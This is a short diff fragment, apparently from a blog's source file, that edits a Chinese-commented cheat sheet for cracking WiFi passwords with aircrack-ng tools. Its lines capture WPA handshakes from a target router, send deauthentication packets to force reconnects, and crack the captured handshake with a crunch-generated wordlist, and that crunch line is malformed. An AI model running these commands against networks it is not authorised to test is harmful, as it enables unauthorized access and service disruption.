@@ -492,7 +492,7 @@ airmon-ng stop wlan0 #关闭网卡
 airodump-ng wlan0mon #启用已激活的wlan0监听wifi
 airodump-ng -c [信道ch] -w /root/cap/er8 --bssid [MAC] wlan0mon  #获取握手协议包储存在目录/root/cap/下
 aireplay-ng -0 5 -a [mac] wlan0mon #发起5次攻击，使路由器重启，然后获得握手包裹
-crunch 10 10 123 &gt;&gt;/root.123.txt /root/cap/er8-01.cap 使用指定目录密码本进行破译握手包
+crunch 10 10 123 &gt;&gt;/root.123.txt /root/cap/er8-01.cap #使用指定目录密码本进行破译握手包
 </code></pre>
 ]]></content>
       <tags>
